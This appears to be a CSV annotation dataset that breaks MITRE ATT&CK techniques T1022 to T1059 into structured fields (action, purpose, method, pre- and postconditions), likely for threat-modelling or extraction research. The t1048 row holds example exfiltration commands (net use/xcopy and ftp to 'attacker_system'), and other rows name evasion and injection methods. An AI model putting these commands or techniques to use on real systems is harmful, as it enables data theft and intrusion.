0,1,3,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,1,,150,exfiltration,data encrypted,t1022,encrypt,data,,,,,hide the information that is being exfiltrated from detection;make the exfiltration less conspicuous upon inspection by a defender,hide/transfer,information,use utility/programming library/custom algorithm/RAR/ZIP,use,utility/programming-library/custom-algorithm//RAR/ZIP/RC4/DES3/AES/AES256/XOR/Base64,encryption-utility-access,exfiltration over command and control channel;exfiltration over alternative protocol,data-encrypted,
,,,599,persistence,shortcut modification,t1023,create,shortcut,,,,,<what>look<\what> like a <where>legitimate program<\where>,look,legitimate program,<what>use<\what> <where>masquerading<\where>,use ,masquerading,,,,
,,,600,persistence,shortcut modification,t1023,edit/replace,target path/existing shortcut,,,,,<what>execute<\what> their <where>tools<\where> for persistence,execute,tool,,,,,,,
,,,597,persistence,shortcut modification,t1023,use,shortcut,,,,,<what>execute<\what> their <where>tools<\where> for persistence,execute,tool,,,,,,,
,1,,147,command and control,custom cryptographic protocol,t1024,encrypt/encode,C2 traffic,,,,,<what> hide <\what> <where> command and control traffic <\where>;lead to unintentional errors,hide,command and control traffic,use custom cryptographic protocol/custom cryptographic algorithm/custom XOR algorithm,use,custom cryptographic protocol/custom cryptographic algorithm; XORing the plaintext with fixed key,C2-Channel-established,,traffic-encrypted,
,1,,154,collection,data from removable media,t1025,search/access/read/mount/collect-data,removable-media,sensitive,,,,"exfiltration;<what> find <\what> <where>files of interest.<where> interactive command shells <\where> may be in<what>use <\what>, and <attribute> common functionality <\attribute> within <where> cmd <\where> may be <what> used <\what>to <why> gather information",find,files of interest,use  interactive command shell/cmd,use, interactive command shell/cmd,"system-compromized
 removable-media-enabled
 removable-media-connected",,removable-media-read,automated collection
,1,,380,command and control,multiband communication,t1026,split,communication/network traffic/C2 traffic,,,,,"<what>bypass<\what> certain <where>firewall restrictions<\where> , <what>avoid<\what> <where>data threshold alerts<\where> on any one communication",bypass /avoid,firewall restriction/data threshold alerts,between different protocol;randomly,,different protocol;random split,C2-Channel-established,,different-protocol-used,
,,,406,defense evasion,obfuscated files or information,t1027,encrypt/obfuscate/encode/compress/archive/split,portion of file/executable/payload/message/code/command/powershell command,,user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution,,,make difficult to <what>discover<\what> or <what>analyze<\what>; evade defense; hide command; evade signature based detections and whitelisting mechanism,make diffficult;evade ;hide,discovery/analysis;defense/signature based detection/whitelisting mechanism;command,"use of steganography; use of compressed or archived scripts, such as Javascrip; use environment variable , alias , character , platform/language specific semantic;via Command-Line Interface; use Invoke-PSImage",use,steganography/compressed script/ archived script/Javascrip/environment variable/ environment alias/environment character/platform specific semantic/language specific semantic/Command-Line Interface/Invoke-PSImage,,,,
,1,,779,"execution, lateral movemnet",windows remote management,t1028,remote-modify,registry/service,,WinRM is-a enabled,enabled-WinRM,WinRm,move laterally to system; remote execute code,move-laterally;remote-execute,sytem;code,"use winrm command , powershell",use,winRM/Powershell,WinRm-enabled,,remote-interaction-occurred,
,1,,779,"execution, lateral movemnet",windows remote management,t1028,remote-run/remote-execute,executable/file/binary/program,,WinRM is-a enabled,enabled-WinRM,WinRm,interact with remote system,interact,remote system,use winrm command from powershell,use,winRM command /Powershell,WinRm-enabled,,remote-interaction-occurred,
,1,,566,exfiltration,scheduled transfer,t1029,exfiltrate,data,,,,,blend traffic patterns with normal activity,blend-traffic-pattern,normal activity,transferring at certain times of day/certain intervals,transfer-data,certain-time/time-interval,C2-channel-established,Exfiltration Over Command and Control Channel / Exfiltration Over Alternative Protocol,data-transfer-time-pattern,
,1,,158,exfiltration,data transfer size limits,t1030,exfiltrate,data,,,,,avoid triggering network data transfer threshold alerts,avoid,network data tranfer alert,fixed size chunks instead of whole files;limit packet sizes below certain thresholds,use,data-size-limit/fixed-size-chunk,data-staged,,data-transferred,
,,,354,persistence,modify existing service,t1031,modifiy/register/kill/terminate/corrupt,service,existing,,,,execute malicious recovery programs/command; make detection analysis more challenging,execute;make-difficult,program/command;detection analysis,use system utility/sc.exe/reg; enabling disabled service,use;enable,custom utility/system utility/sc.exe/reg; disabled/not-commonly-used service,,,,
,1,,663,command and control,standard cryptographic protocol,t1032,encrypt/encode,C2 traffic/c2 communication,,,,,conceal <where>command and control traffic<\where>,conceal,command and control traffic,use known encryption algorithm;employ known encryption algorithm,use/employ,encryption algorithm/DES CBC/AES/SSL/OpenSSL/XOR/RC2/DES/3DES/RC4/AES256/AES-CBC/TLS/plink utility/SEAL encryption/Caracach encryption/Camellia cipher /RSA/RC6/AES ECB,encryption-utility-access,,traffic-encrypted,
,,,688,discovery,system owner/user discovery,t1033,identify,primary user/set of users/user,,,,,,"retrieve,querying","account username,information",,use,users/w/who,,,,
,,,448,"persistence,privilege escalation",path interception,t1034,use,unqoted path weaknesses/service path weakness/shortcut path weakness,,path contain space and does not contain quotation mark,,,persistence if <when><object>executables<\object> are <condition>called on a regular basis<\condition><\when>;privilege escalation if <when><condition>intercepted <object>executables<\object> are started by a higher privileged process<\condition><\whe,maintain;escalate,persistence;privilege,place an executable in a higher level directory of the path,place-executable,high-level-directory,,,,
,,,449,"persistence,privilege escalation",path interception,t1034,use,PATH Environment Variable misconfiguration/ search order hijecking,,path for the program is not given,,,persistence if <when><object>executables<\object> are <condition>called on a regular basis<\condition><\when>;privilege escalation if <when><condition>intercepted <object>executables<\object> are started by a higher privileged process<\condition><\whe,maintain;escalate,persistence;privilege,place an executable/program in a preceeding directory of windows;creating a program named after the improperly specified program and placing it within the initiating program's directory,place-executable;create-program;place-program,preceeding-directory;improperly-specified-program;same-program-directory,,,,
,,,583,execution,service execution,t1035,execute,binary/command/script,,,,,execute binary/payload/DLL,execute,binary/payload/DLL,using windows service service control manager;creating a new service; modifying an existing service,use ; create/modify,windows service control manager; service,,New Seervice; modify existing service,,"new service , modify existing service"
,,,353,defense evasion,masquerading,t1036,change/modify,process name/file metadata,trusted / benign process;  icons/version/name of the product/description/copyright,,,,evading defenses; deceive defenders and system administrators into thinking a file is benign;blend in with the environment,evade;deceive;blend,defenses;defender/ system administrator;environment,,,,,,,
,,,345,defense evasion,masquerading,t1036,manipulate/change/modify,name of an executable/location of an executable,,,,,evading defenses; deceive defenders and system administrators into thinking a file is benign;blend in with the environment,evade;deceive;blend,defenses;defender/ system administrator;environment,rename legitimate utility; using RTLO character; using RLO character; using right-to-left override character; place-executable in trusted location;rename file to close approximatio of legitimate program,rename ;use ;place-executable/move-executable;rename-file,legitimate utility;RTLO character/RLO character/ right-to-left override character; trusted location;close approximatio of legitimate program,,,,
,,,341,"persistence,lateral movement",logon scripts,t1037,insert-code,logon-script,,user is-a logged-in/logged-out,write-access,logon-script,"execute tools,programs; move laterally to system;",execute; move laterally,tool/program;system,using logon scripts,use,logon-script,write-access-permission,,malicious-tool-executed,
,,,174,"persistence,privilege escalation,credential access",dll search order hijacking,t1038,modify,dll-loading-procedure,,,,,load a different dll to maintain persistence or privilege escalation,load;maintain;escalate,malicious dll;persistence;privilege,replacing an existing dll; modifying a .manifest/ .local redirection file/directory/ junction,replace;modify,dll;.manifest/ .local redirection file/directory/ junction,,,,
,,,174,"persistence,privilege escalation,credential access",dll search order hijacking,t1038,use,dll-preloading/binary planting attack/DLL Search Order Hijacking,,,,,load a different dll to maintain persistence or privilege escalation,load;maintain;escalate,malicious dll;persistence;privilege,placing a malicious dll with the same name in current directory/current directory=remote location,place-dll,current-directory/current-directory=remote-location,,,,
,1,,153,collection,data from network shared drive,t1039,search/access/read/mount/collect-data,network-share/network-share-drive,sensitive,,compromised,computers,exfiltration;gather information;<what> find <\what> <where>files <\where>;collect data,find;collect,file;sensitive data,"remote systems via shared network drives (host shared directory, network file server, etc.);use interactive command shells/cmd",use,interactive command shell/ cmd/shared network drive/host shared directory/ network file server,,,,
,1,,393,"credential access ,discovery",network sniffing,t1040,place/sniff,network interface,promiscuous mode,,,,passively <what>access<\what> <where>data<\where> in transit over the network;<what>capture<\what> a larger amount of <where>data<\where>;<what>capture<\what> <where>credentials<\where>,access;capture,data/traffic packet/credential,"hook network API; use span port,techniques for name service resolution poisoning , llmnr/nbt-ns poisoning and relay, SniffPass/responder/Impacket ",hook;use,"network API;  span port/techniques for name service resolution poisoning /""llmnr/nbt-ns poisoning and relay""/ SniffPass/responder/Impacket ",,,,
,,,208,exfiltration,exfiltration over command and control channel,t1041,encode,data,,,,,exfiltrate data,exfiltrate,data,using same protocol as command and control channel,use,data-protocol==C2-protocol,C2-channel-established,,data-encoded,
,,,208,exfiltration,exfiltration over command and control channel,t1041,exfiltrate,data,,,,,exfiltrate data,exfiltrate,data,using command and control channel,use,data-protocol==C2-protocol,C2-channel-established,,data-encoded,
,,,82,persistence,change default file association,t1042,modify,file association registry key value,,,,,continually execute arbitrary commands,execute,command,using assoc utility,use,"assoc-utility;HKEY_CLASSES_ROOT.[extension]; HKEY_CLASSES_ROOT[handler];hkey_classes_root.txt;hkey_classes_root[handler];""hkey_classes_root[handler]\shell[action]\command""; ""hkey_classes_root\txtfile\shell\open\command""; ""hkey_classes_root\txtfile\shell\print\command* ""; hkey_classes_root\txtfile\shell\printto\command""",,,,
,1,,98,command and control,commonly used port,t1043,communicate/send,c2 communication/C2 traffic,,,,,"bypass firewall/nds,blend with normal traffic activity,avoid detailed inspection",,,using tcp:80 (http)/ tcp:443 (https)/tcp:25 (smtp)/tcp/udp:53 (dns)/tcp/udp:135 (rpc)/tcp/udp:22 (ssh)/tcp/udp:3389 (rdp),use,tcp:80 (http)/ tcp:443 (https)/tcp:25 (smtp)/tcp/udp:53 (dns)/tcp/udp:135 (rpc)/tcp/udp:22 (ssh)/tcp/udp:3389 (rdp),System-compromised,,common-port-used,
,,,248,"persistence ,privilege escalation",file system permissions weakness,t1044,replace/overwrite/manipulate,service executable/installer binary/Windows service binary,,installers create subdirectories and files; do not set appropriate permissions to restrict write access,,,gain persistence and/or privilege escalation; execute untrusted code,gain;escalate;execute,persistence;privilege;untrusted-code,using File System Permissions Weakness,use,File System Permissions Weakness,,"related to : DLL Search Order Hijacking, Bypass User Account Control.  ",,
,,,636,defense evasion,software packing,t1045,compress/encrypt/pack,executable,,,,,avoid signature-based detection;evade defense,avoid;evade,signature-based detection;defense,using packer/MPRESS/UPX/own packing technique/virtual machine software protection,use,packer/MPRESS/UPX/own packing technique/virtual machine software protection,,,,
,,,387,discovery,network service scanning,t1046,get-list,remote host service,,,,,,acquire,information,scan/probe open port,use;scan/probe,port scans tool/vulnerability scans tool;open-port,,,,
,,,771,execution,windows management instrumentation,t1047,use,wmi service/server message block /SMB/ Remote Procedure Call Service/RPCS,local and remote access,,,,<what>interact<\what> with <attribute>local and remote<\attribute> <where>systems<\where> ; <what>gathering<\what> <where>information<\where> for discovery ; remote <what>execution <\what>of <where>files<\where>,interact;gather;execute,system;information; file,using Invoke-WmiCommand/wmic command,use,Invoke-WmiCommand command/wmic command,,,,
,,,774,execution,windows management instrumentation,t1047,use,wmi/windows management instrumentation,,,,,"interat with local and remote system, gather information; execute file; perform lateral movement",interact; gather;execute;perform,local-system/remote-system;information;file;lateral movement,"using WMI service, SMB,RPCS",use,WMI service/SMB service/remote procedure call service/RPCS service,,,,
,1,,207,exfiltration,exfiltration over alternative protocol,t1048,send-data/exfiltrate-data,different-network-location,alternate network location,,,,data exfiltration,,,using ftp/smtp/http/https/dns/some-other-network-protocol/internet-web-service/cloud-storage,use,"ftp/smtp/http/https/dns/some-other-network-protocol/internet-web-service/cloud-storage/SMB command/""net use \\attacker_system\IPC$ /user:username password && xcopy /S /H /C /Y C:\Users\* \\attacker_system\share_folder\""/FTP command/""echo PUT C:\Path\to\file.txt | ftp -A attacker_system""",data-staged,,data-transferred,
,,,683,discovery,system network connections discovery,t1049,enumerate/display,network connection,,,,,get-list network connection,get-list,network connection,,use,net utility/netstat/net use/net session/losf/who -a/ who -w,,,,
,,,398,"persistence,privilege escalation",new service,t1050,hide/disguise,service name,,,,,maintain persistence,maintain,persistence, using Masquerading technique;using a name from a related operating system or benign software,use,Masquerading technique/benign software name/operating system name,,,,
,,,397,"persistence,privilege escalation",new service,t1050,install/create/start,service,,,,,<what>execute<\what> at startup;<what>escalate<\what> <where>privileges<\where> from administrator to system,execute;escalate,service;privilege,"<what>using<\what> <where>utilities<\where to <why><what>interact<\what> with <where>services<\where><\why> , directly <what>modifying<\what> the <where>registry<\where> ; through Service Execution technique",use;modify, utility/Service Execution technique;registry,,,,
,,,592,lateral movement,shared webroot,t1051,add-content / browse-content,browser,,network file share contain the website's-webroot/web-content-directory,contain the website's-webroot/web-content-directory,network file share,execute the malicious content; upload remote-access-tool/RAT;execute RAT,execute;upload,content/code/tool/program/RAT;remote-access-tool/RAT,"using open network file share , web browser, PHP script",use,network-file-share/web-browser/PHP-script,shared-webroot-exist,,code-executed,
,1,,211,exfiltration,exfiltration over physical medium,t1052,exfiltrate,data,,,,,exfiltrate data,exfiltrate,data,"physical medium or device introduced by a user , external hard drive , usb drive , cellular phone , mp3 player",use,physical medium/device/external hard drive/usb drive/cellular phone/mp3 player,air-gapped-system-available,,hop-betweeen-disconnected-system-used,
,1,,565,"execution,persistence,privilege escalation",scheduled task,t1053,execute/run/schedule,program,specific date and time,scheduling a task on a remote system typically required being a <condition>member of the <object>administrators group<\object><\condition> on the the remote system.,member of the <object>administrators group<\object>,administrators group,"execute programs at system startup or on a scheduled basis for persistence , conduct remote execution as part of lateral movement , gain system privileges , run a process under the context of a specified account",execute; conduct remote execution; gain;run,program at system startup; lateral movement ;system privilege; process under the context of a specified account,"at , schtasks",use,task scheduling;utility at ; utility schtasks,,,,"exfiltration over command and control channel , exfiltration over alternative protocol"
,,,285,defense evasion,indicator blocking,t1054,block,traffic,,,,,prevent central analysis ,prevent,central analysis,<what> stopping <\what> a local <where> process <\where>; create firewall rule,stop;create,process;firewall rule,,,,
,,,283,defense evasion,indicator blocking,t1054,redirect/disable,event/host-based sensor/ETW,,,,,block indicators or events,block,indicator/event,by tampering/modify setting/registry key/configuration file; using powershell/WMI,tamper/modify;use,setting/registry key/configuration file; powershell/WMI,,,,
,,,486,"defense evasion,privilege escalation",process injection,t1055,inject-code ,ELF binary,,,,,intercept API calls from the running process,intercept ;allow access; evade,API call;process memory/ system resource/network resource;detection,MANIPULATE code stubs mapped in from the linux-vdso.so shared object; USE VDSO hijacking,manipulate;use,code stub mapping;VDSO hijacking,,"reflective dll injection (writing a self-mapping dll into a process), memory module (map dll when writing into process)","reflective dll injection (writing a self-mapping dll into a process), memory module (map dll when writing into process)",
,,,483,"defense evasion,privilege escalation",process injection,t1055,inject-code/inject-dll-path/attach-code,process/ process-thread/APC-queue,,thread must first be suspended;remap memory reference,,,"<what>allow access<\what> to the <where>process's memory<\where>, <where>system resources <\where>/ <where> network resources<\where> , elevated privileges , <what>evade <\what> detection from security products",allow access ;evade,process memory/ system resource/network resource;detection,writing the path to a malicious DLL/code inside a process then invoking execution by creating a remote thread;creating suspended process; use AtomBombing/Early Bird injection,write-dll-path/write-code;create;use,process;remote-thread/suspended-process;AtomBombing/Early Bird injection,,,,
,,,485,"defense evasion,privilege escalation",process injection,t1055,load-library/load-code/load-shared-object/attach-code/attach-library,process,,,,,intercept API calls from the running process,intercept ;allow access; evade,API call;process memory/ system resource/network resource;detection,using Ptrace system call/LD_PRELOAD environment variable/ LD_LIBRARY_PATH environment variable/ DYLD_INSERT_LIBRARIES environment variables/dlfcn application programming interface (API)  ,use,Ptrace system call/LD_PRELOAD environment variable/ LD_LIBRARY_PATH environment variable/ DYLD_INSERT_LIBRARIES environment variables/dlfcn application programming interface (API),,,,
,,,487,"defense evasion,privilege escalation",process injection,t1055,manipulate-pointer,portable-executable/PE,,,,,redirect process to malicious code,"redirect-process;allow access , evade",malicious code;process memory/ system resource/network resource;detection,thread execution hijacking,hijack,thread execution,,process hollowing,process hollowing,
,,,484,"defense evasion,privilege escalation",process injection,t1055,read-code/write-code/read-data/write-data,process memory,,,,,intercept API calls from the running process,intercept ;allow access; evade,API call;process memory/ system resource/network resource;detection,using /proc/[pid]/mem,use,/proc/[pid]/mem,,,,
1,,,297,collection,input capture,t1056,install-code,portals/ vpn login,externally facing,,,,capture and transmit credentials of users;maintain network access,capture/transmit;maintain,user credential;network access,through External Remote Services and Valid Accounts,,External Remote Services technique; Valid Accounts technique,portal-externally-reachable/vpn-externally-reachable,External Remote Services and Valid Accounts,credential-captured; vlaid account; external remote services,
,1,,296,collection,input capture,t1056,log/capture/intercept,user input/keystroke,,,,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",acquire/obtain/capture/transmit;inspect,credential;user input field,"performing a uac prompt , wrapping the windows default credential provider , keylogging",perform;wrap,UAC prompt/keylogging;windows default credential provider,keylogging-enable, Valid Accounts,credential-captured,
,,,476,discovery,process discovery,t1057,obtain-information/get-information,process,,,,,,get; gain,information ;understanding of common software running on systems,,use,tasklist utility/ps command,,,,
,,,588,"privilege escalation,persistence",service registry permissions weakness,t1058,change/alter,service binpath registry key/imagepath registry key/service failure parameter registry key,,"<condition><object>permissions<\object> for users and groups are not properly set<\condition> , <condition>allow access to the <object>registry keys<\object><\condition> for a service","<object>permissions<\object> for users and groups are not properly set , allow access to the <object>registry keys<\object>","permissions , registry keys","<what>point<\what> to a different <where>executable<\where>, <what>gain<\what>persistence , privilege escalation",point ; gain,executable;persistence,using service controller/sc.exe/powershell/Reg,use,service controller/sc.exe/powershell/Reg,,,,
,,,96,execution,command-line interface,t1059,use,command-line interface/cmd,,,,,<what> interact <\what> with <where> systems <\where> and <what> execute <\what> other <where> software <\where> during the course of an operation,interact;execute,system;software/command/code,"use reverse shell/remote shell/cmd.exe/""""cmd.exe"" /C whoami""",use ,"reverse shell/remote shell/cmd.exe/""""cmd.exe"" /C whoami""",,,,
